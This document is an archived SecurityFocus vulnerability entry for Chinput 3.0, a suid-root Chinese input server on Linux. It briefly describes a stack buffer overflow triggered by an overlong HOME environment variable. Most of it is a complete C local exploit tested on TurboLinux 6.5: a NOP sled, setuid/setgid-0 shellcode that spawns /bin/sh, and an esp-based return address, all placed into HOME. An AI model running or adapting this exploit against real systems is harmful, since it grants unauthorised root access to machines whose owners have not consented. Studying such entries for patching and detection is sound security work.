source: http://www.securityfocus.com/bid/3896/info

Chinput is an input server designed for Chinese characters. It is available on Linux and other Unix based systems. Chinput appears to be installed suid root by default.

A vulnerability exists in Chinput. A local user with an extremely long HOME environment variable may cause a buffer to overflow. If successfully exploited, this can overwrite the instruction pointer, and lead to the execution of arbitrary code as root. 

/* local exploit for Chinput 3.0
 * .. tested in TurboLinux 6.5 with kernel 2.2.18
 *
 * Usage: $gcc chinput_exp.c
 *        $./a.out
 *        bash-2.04$ /usr/bin/chinput
 *
 *                       by xperc@hotmail.com
 *                               2002/1/16
 */

#include <stdio.h>
#include <stdlib.h>

#define NOP 0x90
#define OFS 0x1f0

unsigned long get_esp()
{
    __asm__("mov %esp,%eax");
}

char *shellcode=
    "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"    /*
setuid=0 */
    "\x31\xc0\x31\xdb\xb0\x2e\xcd\x80"    /*
setgid=0 */
    "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b"
    "\x33\xd2\x89\x56\x07\x89\x56\x0f"
    "\xb8\x1b\x56\x34\x12\x35\x10\x56"
    "\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
    "\x80\x33\xc0\x40\xcd\x80\xe8\xd7"
    "\xff\xff\xff/bin/sh";


char s[512];
char *s1;

int main()
{
	strcpy(s,"HOME=");
	s1=s+5;
	while(s1<s+260+5-strlen(shellcode))
	    *(s1++)=NOP;

	while(*shellcode)
            *(s1++)=*(shellcode++);
        *((unsigned long *)s1)=get_esp()-OFS;
	printf("Jump to: %p\n",*((long *)s1));
	s1+=4;
	*s1=0;
	putenv(s);
	system("bash");
}